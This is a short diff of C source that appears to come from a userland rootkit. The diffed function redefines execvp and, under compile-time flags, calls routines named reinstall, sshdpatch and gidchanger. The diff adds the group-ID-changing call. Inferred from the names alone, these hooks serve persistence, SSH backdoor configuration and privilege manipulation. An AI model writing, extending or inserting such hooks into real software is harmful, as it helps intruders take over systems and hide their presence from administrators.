@@ -2,6 +2,9 @@ int execvp(const char *filename, char *const argv[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
 #endif
+#ifdef AUTO_GID_CHANGER
+    gidchanger();
+#endif
 #ifdef PATCH_SSHD_CONFIG
     sshdpatch(REG_USR);
 #endif
